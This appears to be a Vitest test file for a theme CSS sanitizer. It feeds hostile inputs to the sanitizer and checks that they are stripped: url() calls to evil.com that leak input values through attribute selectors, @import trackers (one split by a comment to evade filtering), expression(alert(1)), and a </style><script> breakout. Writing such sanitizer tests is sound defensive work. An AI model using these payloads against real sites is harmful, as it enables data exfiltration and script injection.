import { describe, it, expect } from 'vitest'
import { sanitizeThemeCss } from '../../server/utils/sanitize-css-svg'

describe('Theme CSS Sanitization (sanitizeThemeCss)', () => {
  it('leaves ordinary declarative CSS untouched', () => {
    const css = `:root { --nuxflow-primary: #00dc82; } .card { border-radius: 8px; padding: 1rem; }`
    expect(sanitizeThemeCss(css)).toBe(css)
  })

  it('strips url() everywhere, closing the attribute-selector exfiltration vector', () => {
    const css = `input[value^="a"] { background: url(https://evil.com/?leak=a); }`
    const result = sanitizeThemeCss(css)
    expect(result).not.toContain('evil.com')
    expect(result).toContain('background: none')
  })

  it('strips url() regardless of quoting style', () => {
    expect(sanitizeThemeCss(`a { background: url("https://evil.com/x.png"); }`)).not.toContain('evil.com')
    expect(sanitizeThemeCss(`a { background: url('https://evil.com/x.png'); }`)).not.toContain('evil.com')
    expect(sanitizeThemeCss(`a { background: url(https://evil.com/x.png); }`)).not.toContain('evil.com')
  })

  // Regression: a naive `url\([^)]*\)` stops at the FIRST ')', so a quoted data: URI
  // containing a literal ')' inside its own value (routine for inline SVG — rgba()/
  // matrix()/translate() and similar) only has its prefix replaced with 'none', leaving
  // the true remainder of the value — including the real closing ')' and trailing ';' —
  // as unescaped garbage text that corrupts the stylesheet from that point on. Caught by
  // diffing production theme CSS: a mask-image data: URI containing `rgba(...)` produced
  // exactly this — a mangled declaration whose garbage tail read like
  // `none'/%3E%3C/svg%3E");`, breaking every rule after it in the browser's parser.
  it('cleanly strips a quoted url() value that contains a literal ) inside the quotes', () => {
    const css = `.icon { mask-image: url('data:image/svg+xml,%3Csvg fill="rgba(0,0,0,0.5)"%3E%3C/svg%3E'); } .after { color: red; }`
    const result = sanitizeThemeCss(css)
    expect(result).toContain('mask-image: none')
    expect(result).not.toContain('rgba')
    expect(result).not.toMatch(/none['")]/) // no leftover quote/paren garbage stuck to 'none'
    // The rule *after* the mangled one must survive intact — this is what a parser-desync
    // bug would silently break.
    expect(result).toContain('.after { color: red; }')
  })

  it('cleanly strips a double-quoted url() value containing a literal )', () => {
    const css = `a { background-image: url("data:image/svg+xml,%3Cpath transform='matrix(1,0,0,1,0,0)'/%3E"); }`
    const result = sanitizeThemeCss(css)
    expect(result).toBe(`a { background-image: none; }`)
  })

  it('strips @import statements entirely', () => {
    const css = `@import url(https://evil.com/tracker.css);\nbody { color: red; }`
    const result = sanitizeThemeCss(css)
    expect(result).not.toContain('@import')
    expect(result).not.toContain('evil.com')
    expect(result).toContain('body { color: red; }')
  })

  it('strips @import with a quoted string form', () => {
    const css = `@import "https://evil.com/tracker.css";\nbody { color: red; }`
    expect(sanitizeThemeCss(css)).not.toContain('evil.com')
  })

  it('strips constructs hidden inside comments before matching', () => {
    const css = `@im/* hide */port url(https://evil.com/x.css);`
    const result = sanitizeThemeCss(css)
    expect(result).not.toContain('evil.com')
  })

  it('strips legacy IE expression()', () => {
    const css = `.x { width: expression(alert(1)); }`
    expect(sanitizeThemeCss(css)).not.toMatch(/expression\s*\(/)
  })

  it('strips </style> to prevent breaking out of the injected style block', () => {
    const css = `body {}</style><script>alert(1)</script><style>`
    expect(sanitizeThemeCss(css)).not.toContain('</style>')
  })

  it('is idempotent — sanitizing already-clean CSS twice produces the same output', () => {
    const css = `:root { --nuxflow-primary: #00dc82; }`
    const once = sanitizeThemeCss(css)
    const twice = sanitizeThemeCss(once)
    expect(twice).toBe(once)
  })
})
